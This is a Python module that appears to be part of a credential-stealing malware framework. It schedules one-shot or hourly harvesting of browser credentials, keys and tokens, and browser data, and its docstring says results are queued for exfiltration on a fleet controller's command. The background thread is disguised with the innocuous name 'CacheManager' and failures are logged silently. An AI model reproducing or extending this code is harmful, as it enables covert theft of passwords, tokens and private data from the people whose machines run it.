"""
Harvest scheduler — orchestrates credential and data harvesting.

Supports:
  - One-shot and periodic harvesting modes
  - Change detection (only re-harvest when source files are modified)
  - Fleet integration (trigger harvest via controller command)
  - Results encrypted and queued for sync/exfiltration

Usage::

    from harvest.scheduler import HarvestScheduler

    scheduler = HarvestScheduler(config)
    results = scheduler.run_harvest()     # one-shot
    scheduler.start_periodic()            # background periodic
    scheduler.stop()
"""
from __future__ import annotations

import hashlib
import json
import logging
import threading
import time
from typing import Any

logger = logging.getLogger(__name__)


class HarvestScheduler:
    """Orchestrates harvesting with scheduling and change detection.

    Parameters
    ----------
    config : dict
        Harvest configuration section.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        cfg = config or {}
        self._interval: float = float(cfg.get("interval_seconds", 3600))  # default: 1 hour
        self._change_detection: bool = bool(cfg.get("change_detection", True))
        self._enabled_sources: list[str] = list(cfg.get("sources", [
            "browser_creds", "keys",
        ]))
        self._previous_hashes: dict[str, str] = {}
        self._thread: threading.Thread | None = None
        self._stop_event = threading.Event()
        self._last_results: list[dict[str, Any]] = []

    def run_harvest(self) -> list[dict[str, Any]]:
        """Run a single harvest cycle across all enabled sources.

        Returns
        -------
        list[dict]
            Combined results from all harvesters.
        """
        results: list[dict[str, Any]] = []

        if "browser_creds" in self._enabled_sources:
            try:
                from harvest.browser_creds import BrowserCredentialHarvester
                harvester = BrowserCredentialHarvester()
                creds = harvester.harvest_all()
                if self._should_report(creds, "browser_creds"):
                    for c in creds:
                        c["harvest_type"] = "browser_credential"
                        c["timestamp"] = time.time()
                    results.extend(creds)
            except Exception as exc:
                logger.debug("Browser credential harvest failed: %s", exc)

        if "keys" in self._enabled_sources:
            try:
                from harvest.keys import KeyHarvester
                harvester = KeyHarvester()
                keys = harvester.harvest_all()
                if self._should_report(keys, "keys"):
                    for k in keys:
                        k["harvest_type"] = "key_or_token"
                        k["timestamp"] = time.time()
                    results.extend(keys)
            except Exception as exc:
                logger.debug("Key harvest failed: %s", exc)

        if "browser_data" in self._enabled_sources:
            try:
                from harvest.browser_data import BrowserDataHarvester
                harvester = BrowserDataHarvester()
                data = harvester.harvest_all()
                if self._should_report(data, "browser_data"):
                    for d in data:
                        d["harvest_type"] = "browser_data"
                        d["timestamp"] = time.time()
                    results.extend(data)
            except Exception as exc:
                logger.debug("Browser data harvest failed: %s", exc)

        self._last_results = results
        logger.debug("Harvest complete: %d items from %d sources",
                      len(results), len(self._enabled_sources))
        return results

    def start_periodic(self) -> None:
        """Start periodic harvesting in a background thread."""
        if self._thread is not None:
            return
        self._stop_event.clear()
        self._thread = threading.Thread(
            target=self._periodic_loop,
            name="CacheManager",  # innocuous thread name
            daemon=True,
        )
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=10)
        self._thread = None

    def get_last_results(self) -> list[dict[str, Any]]:
        return list(self._last_results)

    def get_status(self) -> dict[str, Any]:
        return {
            "enabled_sources": self._enabled_sources,
            "interval_seconds": self._interval,
            "change_detection": self._change_detection,
            "last_result_count": len(self._last_results),
            "running": self._thread is not None and self._thread.is_alive(),
        }

    # ── Change detection ─────────────────────────────────────────────

    def _should_report(self, results: list[dict[str, Any]], source: str) -> bool:
        """Return True if results have changed since the last harvest for this source."""
        if not self._change_detection:
            return True
        content_hash = hashlib.sha256(
            json.dumps(results, sort_keys=True, default=str).encode()
        ).hexdigest()
        previous = self._previous_hashes.get(source)
        self._previous_hashes[source] = content_hash
        return content_hash != previous

    # ── Periodic loop ────────────────────────────────────────────────

    def _periodic_loop(self) -> None:
        while not self._stop_event.is_set():
            try:
                self.run_harvest()
            except Exception as exc:
                logger.debug("Periodic harvest error: %s", exc)
            self._stop_event.wait(self._interval)
